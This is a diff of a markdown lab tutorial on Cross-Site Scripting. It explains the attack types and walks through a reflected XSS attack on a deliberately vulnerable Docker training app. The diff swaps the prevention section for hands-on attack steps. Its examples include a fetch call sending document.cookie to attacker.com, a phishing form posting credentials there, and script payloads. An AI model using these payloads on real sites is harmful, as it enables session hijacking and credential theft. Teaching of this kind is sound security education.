@@ -1,16 +1,18 @@
 # **Cross-Site Scripting (XSS)**
 
-Cross-Site Scripting (XSS) is a critical security vulnerability in web applications that allows attackers to inject and execute malicious scripts in a user’s browser. These scripts can compromise sensitive data, hijack user sessions, deface websites, or perform unauthorized actions.
+Cross-Site Scripting (XSS) is a critical security vulnerability in web applications that allows attackers to inject and execute malicious scripts in a user’s browser. These scripts can compromise sensitive data, hijack user sessions, deface websites, or perform unauthorized actions. We will also perform a Reflected XSS attack on an application to understand how it works.
 
 ## **Objective**
-
-This documentation aims to provide a clear understanding of XSS, its types, how it works, and how to prevent it. It includes detailed code examples to help developers recognize and mitigate XSS risks.
+- Understand basics of XSS and how it works.
+- Learn about different types of XSS attacks.
+- Understand how Reflected XSS works.
+- Perform a Reflected XSS attack on an application.
 
 ## **What is Cross-Site Scripting (XSS)?**
 
 XSS is a **web security vulnerability** where attackers inject **malicious scripts** into web pages. These scripts can manipulate the DOM, steal sensitive data, and impersonate users. XSS attacks usually exploit vulnerabilities in input handling and output rendering in web applications.
 
-![](./images/Diagrams.drawio.svg)
+![](./images/1.svg)
 
 ## **How Does XSS Work?**
 
@@ -38,10 +40,15 @@ Once executed, the script can perform harmful actions such as:
   ```javascript
   fetch('https://attacker.com/steal?cookie=' + document.cookie);
   ```
+
+  `document.cookie` is used to get the cookies of the user which is stored in the browser.
+
 - **Manipulating the page (DOM)**:  
   ```javascript
   document.body.innerHTML = '<h1>This site has been hacked!</h1>';
   ```
+  `innerHTML` is used to get the innerHTML of the body of the page. When the page is loaded, the script is executed and the innerHTML of the body is changed to `<h1>This site has been hacked!</h1>`.
+
 - **Tricking users with phishing forms**:
   ```html
   <form action="https://attacker.com/login" method="POST">
@@ -51,7 +58,7 @@ Once executed, the script can perform harmful actions such as:
   </form>
   ```
 
----
+  The form is submitted to the attacker's server and the username and password are stolen. User is not aware that their credentials are being stolen as the form is submitted to the attacker's server and the user is redirected to the attacker's website.
 
 ## **Types of XSS Attacks**
 
@@ -59,56 +66,35 @@ Once executed, the script can perform harmful actions such as:
 2. **Reflected XSS (Non-Persistent XSS)**  
 3. **DOM-Based XSS**
 
----
-
 ### **1. Stored XSS (Persistent XSS)**  
 In **Stored XSS**, the malicious input is saved on the server, such as in a database. It gets embedded in a web page and automatically executed whenever a user accesses that page. For example, an attacker could post a comment containing a script, which runs whenever someone views the comment.
-
----
 
 ### **2. Reflected XSS (Non-Persistent XSS)**  
 In **Reflected XSS**, the injected script is not stored on the server. Instead, it is included in the server's response based on user input. The attack usually requires the victim to click a malicious link that contains the script in a query parameter or form submission.
 
----
-
 ### **3. DOM-Based XSS**  
 In **DOM-Based XSS**, the vulnerability is present in client-side JavaScript code. The application reads untrusted input (e.g., from the URL) and dynamically manipulates the page's content, leading to script execution without any server involvement.
 
----
 
-## **Reflected XSS in Detail**
-
-### **What is Reflected XSS?**
+## **Reflected XSS**
 
 Reflected XSS, also known as **non-persistent XSS**, occurs when the web application immediately reflects user input in the server’s response without properly validating or escaping it. Since the input is not stored, the attack typically relies on **social engineering** to trick the user into visiting a specially crafted malicious link.
 
----
-
 ### **How Reflected XSS Works**
 
-1. **Malicious Input Submission:** The attacker sends a crafted input (e.g., a `<script>` tag) through a URL or form.
-2. **Reflection:** The server includes this input in its HTML response without sanitization.
-3. **Script Execution:** When the victim views the response, the browser executes the script.
+![](./images/2.svg)
 
-#### **Example Scenario**
-- A website search feature is vulnerable and reflects user input:
-  ```html
-  <p>Search results for: {user_input}</p>
-  ```
+1. **Attacker Crafts Malicious URL**  
+   The hacker creates a URL containing a malicious script and tricks the user into clicking it.
 
-- An attacker crafts a malicious link:
-  ```
-  https://example.com/search?query=<script>alert('XSS Attack');</script>
-  ```
+2. **User Clicks the Malicious URL**  
+   The victim unknowingly interacts with the link, sending a request to the vulnerable website.
 
-- The script is reflected in the page output:
-  ```html
-  <p>Search results for: <script>alert('XSS Attack');</script></p>
-  ```
+3. **Website Reflects the Malicious Script**  
+   The website processes the request and includes the malicious script in its response without proper sanitization.
 
-- When the victim clicks the link, the browser executes the script, displaying an alert box.
-
----
+4. **User’s Browser Executes the Script**  
+   The victim's browser runs the injected script, which can steal sensitive information or compromise the user's session.
 
 ### **Impact of Reflected XSS**
 
@@ -117,32 +103,71 @@ Reflected XSS, also known as **non-persistent XSS**, occurs when the web applica
 - **Phishing:** Attackers can trick victims into entering credentials by displaying fake login forms.
 - **Page Defacement:** The attacker can alter the appearance and content of the web page.
 
----
+## **Hands-on with Reflected XSS**
 
-### **Prevention of Reflected XSS**
+1. **Pull the Docker Image**
 
-To prevent reflected XSS attacks, implement the following measures:
+   ```bash
+   docker pull fazlulkarim105925/reflected-xss
+   ```
 
-1. **Input Validation:** Ensure user input adheres to expected formats (e.g., allow only alphanumeric characters).
-2. **Output Encoding:** Encode user input before including it in the HTML output, escaping special characters like `<`, `>`, `&`, `'`, and `"`.
+2. **Run the Docker Container**
 
-**Example (Python with Flask):**
-```python
-from flask import request, escape
+   ```bash
+   docker run -d -p 8000:8000 fazlulkarim105925/reflected-xss
+   ```
+3. **Create a Load Balancer in Poridhi's Cloud**
 
-@app.route('/search')
-def search():
-    query = request.args.get('query')
-    return f"<p>Search results for: {escape(query)}</p>"
+   Find the `eth0` IP address with `ifconfig` command.
+
+   ![](./images/3.png)
+
+   Create a Load Balancer with the `eth0 IP` address and the port `8000`
+
+   ![](./images/4.png)
+
+4. **Access the Web Application**
+
+   Access the web application with the the provided `URL` by `loadbalancer`
+
+   ![](./images/5.png)
+
+
+### **Exploring the Application**
+
+This web app designed to demonstrate Reflected XSS attacks. It allows users to input data, which is reflected without sanitization, making it vulnerable to malicious script execution. The app includes an attack simulation, hacker dashboard for captured data, and an XSS explanation page.
+
+In `Home` page, if we enter any value in the `name` field, it will be reflected in the `results` field and greet the user with the value entered in the `field`.
+
+![](./images/6.png)
+
+Now, if we enter the following value in the `name` field:
+
+```html
+<script>alert('XSS Attack');</script>
 ```
 
-3. **Use Secure APIs:** Avoid inserting user input directly into HTML or JavaScript. Use methods like `textContent` instead of `innerHTML` to prevent script execution.
+The value will be reflected in the `results` field and the script will be executed.
 
----
+![](./images/7.png)
 
-### **Hands-on Example: Reflected XSS**
-*(This section is reserved for a practical demonstration to be added later.)*
+Now if open the `inspect` tool ( By pressing `Ctrl + Shift + I` in the browser) and check the `elements` tab, we can see that the value entered in the `name` field is reflected in the `results` field and the script is executed.
 
---- 
+![](./images/8.png)
 
-This completes the detailed explanation of Reflected XSS.
+In the Application, you will find a `Button` named `Special Greeting`.
+
+![](./images/9.png)
+
+If we click on the the Button, it will redirect you to `/whatWasHappen` page with a modal indicating that the information is being `hacked`. It basically send the browser to `/whatWasHappen` route within the application.
+
+![](./images/10.png)
+
+Now as your information is being `hacked`, you can see the `hacked` information by clicking on `View Stolen Data` Button.
+
+![](./images/11.png)
+
+
+## **Conclusion**
+
+In this lab, we have learned about the basics of XSS and how it works. We have also learned about different types of XSS attacks and how to perform a Reflected XSS attack on an application. In our upcoming labs, we will learn about how to detect and prevent XSS attacks.
